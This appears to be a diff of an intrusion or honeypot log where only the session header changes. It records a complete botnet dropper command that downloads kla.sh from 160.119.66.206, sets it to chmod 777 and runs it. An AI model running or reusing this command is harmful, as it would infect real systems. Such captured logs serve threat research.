@@ -1,2 +1,2 @@
-=== session 5c7c386ac0d3 | src_ip 160.119.66.XYZ | 2026-09-15T11:14:01.158Z ===
+=== session e0ce44e26a13 | src_ip 160.119.66.XYZ | 2026-09-16T02:38:51.030Z ===
 cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
